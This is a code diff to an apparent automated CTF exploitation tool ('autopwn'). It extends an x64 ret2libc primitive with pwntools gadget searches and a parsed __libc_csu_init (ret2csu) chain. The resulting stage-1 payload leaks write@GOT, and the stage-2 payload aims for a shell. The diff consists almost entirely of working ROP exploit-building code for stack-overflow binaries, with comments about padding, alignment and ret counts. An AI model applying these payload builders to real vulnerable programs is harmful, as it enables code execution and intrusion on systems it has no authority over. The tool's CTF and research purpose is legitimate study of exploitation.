@@ -66,11 +66,275 @@ Design notes
 """
 from __future__ import annotations
 
+import re
+from dataclasses import dataclass
+from functools import lru_cache
 from pathlib import Path
 from typing import Optional, Tuple
 
 from autopwn.context import ExploitContext
+from autopwn.core.runner import run_objdump_disasm
 from autopwn.primitives.base import ExploitPrimitive
+
+
+_OBJDUMP_INSN_RE = re.compile(r"^\s*([0-9a-fA-F]+):\s+([a-z].*?)\s*$")
+_INTEL_MOV_RE = re.compile(r"^mov\s+([a-z0-9]+)\s*,\s*([a-z0-9]+)$")
+_INTEL_POP_RE = re.compile(r"^pop\s+([a-z0-9]+)$")
+_INTEL_ADD_RSP_RE = re.compile(r"^add\s+rsp\s*,\s*(0x[0-9a-f]+|\d+)$")
+_INTEL_CALL_PTR_RE = re.compile(r"^call\s+(?:qword ptr\s+)?\[(r[a-z0-9]+)\+rbx\*8\]$")
+_X64_CSU_ARG_REGS = {"rdi", "rsi", "rdx"}
+_X64_REG_ALIASES = {
+    "edi": "rdi",
+    "esi": "rsi",
+    "edx": "rdx",
+    "ebx": "rbx",
+    "ebp": "rbp",
+    "r12d": "r12",
+    "r13d": "r13",
+    "r14d": "r14",
+    "r15d": "r15",
+}
+
+
+@dataclass(frozen=True)
+class _X64PopGadget:
+    """A ``pop rdx; ...; ret`` gadget plus its trailing pop count."""
+
+    addr: int
+    extra_pop_count: int = 0
+
+
+@dataclass(frozen=True)
+class _X64Ret2CSUPlan:
+    """Parsed ``__libc_csu_init`` recipe for a 3-argument indirect call."""
+
+    pop_gadget: int
+    call_gadget: int
+    pop_order: tuple[str, ...]
+    arg_reg_map: tuple[tuple[str, str], ...]
+    call_reg: str
+    stack_skip_qwords: int = 1
+
+
+def _normalize_x64_reg(name: str) -> str:
+    """Normalize 32-bit register spellings (``edi``) to 64-bit form (``rdi``)."""
+    reg = name.strip().lower().lstrip("%")
+    return _X64_REG_ALIASES.get(reg, reg)
+
+
+def _pack_x64_chain(padding: int, *words: int) -> bytes:
+    """Return ``padding`` bytes of NOPs followed by ``p64``-packed words."""
+    from pwn import asm, p64
+
+    return asm("nop") * padding + b"".join(p64(word) for word in words)
+
+
+@lru_cache(maxsize=None)
+def _find_x64_pop_rdx_gadget(program_str: str) -> Optional[_X64PopGadget]:
+    """Find the shortest usable ``pop rdx; ...; ret`` gadget in ``program``."""
+    from pwn import ELF, ROP
+
+    try:
+        elf = ELF(program_str, checksec=False)
+        rop = ROP(elf)
+    except Exception:
+        return None
+
+    candidates = []
+    for addr, gadget in rop.gadgets.items():
+        insns = tuple(str(insn).strip().lower() for insn in gadget.insns)
+        if len(insns) < 2 or insns[0] != "pop rdx" or insns[-1] != "ret":
+            continue
+        middle = insns[1:-1]
+        if not all(insn.startswith("pop ") for insn in middle):
+            continue
+        candidates.append(_X64PopGadget(addr=addr, extra_pop_count=len(middle)))
+
+    if not candidates:
+        return None
+    return min(candidates, key=lambda g: (g.extra_pop_count, g.addr))
+
+
+@lru_cache(maxsize=None)
+def _parse_intel_objdump_function(program_str: str, func_name: str) -> tuple[tuple[int, str], ...]:
+    """Extract ``(addr, instruction)`` tuples for ``func_name`` from objdump output."""
+    content = run_objdump_disasm(Path(program_str), intel=True)
+    marker = f"<{func_name}>:"
+    in_func = False
+    instructions = []
+
+    for raw_line in content.splitlines():
+        line = raw_line.rstrip()
+        if not in_func:
+            if marker in line:
+                in_func = True
+            continue
+        if not line.strip():
+            break
+        match = _OBJDUMP_INSN_RE.match(line)
+        if not match:
+            if "<" in line and ">:" in line:
+                break
+            continue
+        addr, insn = match.groups()
+        instructions.append((int(addr, 16), insn.strip().lower()))
+
+    return tuple(instructions)
+
+
+@lru_cache(maxsize=None)
+def _find_x64_ret2csu_plan(program_str: str) -> Optional[_X64Ret2CSUPlan]:
+    """Parse ``__libc_csu_init`` into a fail-closed ret2csu plan."""
+    instructions = _parse_intel_objdump_function(program_str, "__libc_csu_init")
+    if not instructions:
+        return None
+
+    call_index = None
+    call_reg = None
+    for index, (_, insn) in enumerate(instructions):
+        call_match = _INTEL_CALL_PTR_RE.match(insn)
+        if call_match:
+            call_index = index
+            call_reg = _normalize_x64_reg(call_match.group(1))
+            break
+    if call_index is None or call_reg is None:
+        return None
+
+    arg_reg_map: dict[str, str] = {}
+    first_move_index = call_index
+    cursor = call_index - 1
+    while cursor >= 0:
+        move_match = _INTEL_MOV_RE.match(instructions[cursor][1])
+        if not move_match:
+            break
+        dst = _normalize_x64_reg(move_match.group(1))
+        src = _normalize_x64_reg(move_match.group(2))
+        if dst not in _X64_CSU_ARG_REGS:
+            break
+        arg_reg_map[dst] = src
+        first_move_index = cursor
+        cursor -= 1
+    if set(arg_reg_map) != _X64_CSU_ARG_REGS:
+        return None
+
+    for index in range(call_index + 1, len(instructions)):
+        add_match = _INTEL_ADD_RSP_RE.match(instructions[index][1])
+        if not add_match:
+            continue
+        stack_skip = int(add_match.group(1), 0)
+        if stack_skip % 8 != 0:
+            continue
+
+        pop_order = []
+        pop_index = index + 1
+        while pop_index < len(instructions):
+            pop_match = _INTEL_POP_RE.match(instructions[pop_index][1])
+            if not pop_match:
+                break
+            pop_order.append(_normalize_x64_reg(pop_match.group(1)))
+            pop_index += 1
+
+        if not pop_order or pop_index >= len(instructions):
+            continue
+        if instructions[pop_index][1] != "ret":
+            continue
+
+        required = {"rbx", "rbp", call_reg, *arg_reg_map.values()}
+        if not required.issubset(set(pop_order)):
+            return None
+
+        return _X64Ret2CSUPlan(
+            pop_gadget=instructions[index + 1][0],
+            call_gadget=instructions[first_move_index][0],
+            pop_order=tuple(pop_order),
+            arg_reg_map=tuple(sorted(arg_reg_map.items())),
+            call_reg=call_reg,
+            stack_skip_qwords=stack_skip // 8,
+        )
+
+    return None
+
+
+def _build_x64_write_stage1_direct(
+    ctx: ExploitContext,
+    write_plt: Optional[int],
+    write_got: Optional[int],
+    main_addr: Optional[int],
+) -> bytes:
+    """Build ``write(1, write@got, 8)`` via direct pop gadgets, including ``rdx``."""
+    if (
+        ctx.gadgets_x64 is None
+        or ctx.gadgets_x64.pop_rdi == 0
+        or ctx.gadgets_x64.pop_rsi == 0
+        or write_plt is None
+        or write_got is None
+        or main_addr is None
+    ):
+        return b""
+
+    rdx_gadget = _find_x64_pop_rdx_gadget(str(ctx.binary.path))
+    if rdx_gadget is None:
+        return b""
+
+    g = ctx.gadgets_x64
+    chain = [
+        g.pop_rdi, 1,
+        *([0] * max(0, g.extra_rdi)),
+        g.pop_rsi, write_got,
+        *([0] * max(0, g.extra_rsi)),
+        rdx_gadget.addr, 8,
+        *([0] * rdx_gadget.extra_pop_count),
+        write_plt, main_addr,
+    ]
+    return _pack_x64_chain(ctx.padding, *chain)
+
+
+def _build_x64_write_stage1_ret2csu(
+    ctx: ExploitContext,
+    write_got: Optional[int],
+    main_addr: Optional[int],
+) -> bytes:
+    """Build ``write(1, write@got, 8)`` via parsed ``__libc_csu_init``."""
+    if write_got is None or main_addr is None:
+        return b""
+
+    plan = _find_x64_ret2csu_plan(str(ctx.binary.path))
+    if plan is None:
+        return b""
+
+    arg_reg_map = dict(plan.arg_reg_map)
+    register_values: dict[str, int] = {
+        "rbx": 0,
+        "rbp": 1,
+    }
+
+    def assign(reg: str, value: int) -> bool:
+        existing = register_values.get(reg)
+        if existing is not None and existing != value:
+            return False
+        register_values[reg] = value
+        return True
+
+    if not assign(plan.call_reg, write_got):
+        return b""
+    if not assign(arg_reg_map["rdi"], 1):
+        return b""
+    if not assign(arg_reg_map["rsi"], write_got):
+        return b""
+    if not assign(arg_reg_map["rdx"], 8):
+        return b""
+
+    initial_pop_values = [register_values.get(reg, 0) for reg in plan.pop_order]
+    unwind_values = [0] * len(plan.pop_order)
+    chain = [
+        plan.pop_gadget,
+        *initial_pop_values,
+        plan.call_gadget,
+        *([0] * max(0, plan.stack_skip_qwords)),
+        *unwind_values,
+        main_addr,
+    ]
+    return _pack_x64_chain(ctx.padding, *chain)
 
 
 def _lookup_write_and_main(program: Path) -> Tuple[Optional[int], Optional[int], Optional[int]]:
@@ -232,55 +496,23 @@ class Ret2LibcWriteX64(ExploitPrimitive):
         return 2
 
     def build_payload(self, ctx: ExploitContext) -> bytes:
-        """Build the stage-1 leak payload (``write(1, write@GOT, n)``).
+        """Build the stage-1 leak payload (``write(1, write@GOT, 8)``).
 
-        Mirrors v3.1 ``_legacy.ret2libc_write_x64`` 3-variant cascade
-        (P6.4b fix, B-007): the pop chain layout depends on whether
-        ropper found ``pop rdi; pop <reg>; ret`` (``extra_rdi=1``)
-        and/or ``pop rsi; pop <reg>; ret`` (``extra_rsi=1``).  When
-        the gadget pops an extra register, v3.1 inserts a 0 placeholder
-        in the stack chain to consume that extra slot — without it,
-        the ROP chain goes out of alignment and ``write()`` returns to
-        a garbage address (manifests as ``unpack requires a buffer of
-        8 bytes`` during leak parse — P6.4b regression target).
+        v4.1.15 reclassifies the old ``level3_x64`` failure as a
+        generic x64 3-argument leak bug: the historic chain controlled
+        only ``rdi/rsi`` and left ``rdx`` to runtime residue.  The
+        repaired builder now prefers a direct ``pop rdx; ...; ret``
+        gadget and otherwise falls back to a parsed ``__libc_csu_init``
+        chain.  If neither path exists, it returns ``b""``.
         """
-        from pwn import asm, flat, p64
-
-        if (
-            ctx.gadgets_x64 is None
-            or ctx.gadgets_x64.pop_rdi == 0
-            or ctx.gadgets_x64.pop_rsi == 0
-        ):
-            return b""
-
         write_plt, write_got, main_addr = _lookup_write_and_main(ctx.binary.path)
-        if write_plt is None or write_got is None or main_addr is None:
+        if write_got is None or main_addr is None:
             return b""
 
-        g = ctx.gadgets_x64
-        if g.extra_rsi == 1:
-            # v3.1 L927-937: pop rsi; pop <reg>; ret → 0 placeholder after write_got
-            return flat(
-                asm("nop") * ctx.padding
-                + p64(g.pop_rdi) + p64(1)
-                + p64(g.pop_rsi) + p64(write_got) + p64(0)  # 0 placeholder
-                + p64(write_plt) + p64(main_addr)
-            )
-        if g.extra_rdi == 1:
-            # v3.1 L938-948: pop rdi; pop <reg>; ret → 0 placeholder after fd
-            return flat(
-                asm("nop") * ctx.padding
-                + p64(g.pop_rdi) + p64(1) + p64(0)  # 0 placeholder
-                + p64(g.pop_rsi) + p64(write_got)
-                + p64(write_plt) + p64(main_addr)
-            )
-        # v3.1 L949-958: both extra == 0 → 5-arg pop chain
-        return flat(
-            asm("nop") * ctx.padding
-            + p64(g.pop_rdi) + p64(1)
-            + p64(g.pop_rsi) + p64(write_got)
-            + p64(write_plt) + p64(main_addr)
-        )
+        payload = _build_x64_write_stage1_direct(ctx, write_plt, write_got, main_addr)
+        if payload:
+            return payload
+        return _build_x64_write_stage1_ret2csu(ctx, write_got, main_addr)
 
     def build_stage2_payload(
         self, ctx: ExploitContext, leaked_write_addr: int,
@@ -326,16 +558,19 @@ class Ret2LibcWriteX64(ExploitPrimitive):
         except (KeyError, AttributeError, StopIteration):
             return b""
 
-        # v4.0.5: principled ret-count from FrameContext (default
-        # True keeps v4.0.1 always-align behaviour when the recon
-        # phase did not populate frame_context — defensive fallback).
+        # v4.1.15: x64 write-leak is a 2-stage primitive that returns to
+        # main() before re-entering the vulnerable path.  In the current
+        # ctf_env runtime (2026-08-30), relying on a raw
+        # frame_context.required_ret_count == 0 leaves stage 2 crashing
+        # before shell verification.  Keep the frame-derived count, but
+        # clamp it to a conservative minimum of 1 ret for this primitive.
         g = ctx.gadgets_x64
-        include_ret = bool(
+        required_ret_count = (
             ctx.frame_context.required_ret_count
             if ctx.frame_context is not None
             else 1
         )
-        ret_gadget = p64(g.ret) if include_ret else b""
+        ret_gadget = p64(g.ret) * max(1, required_ret_count)
 
         if g.extra_rdi == 1:
             # v3.1 L983-996: extra_rdi=1 → 0 placeholder between sh and ret
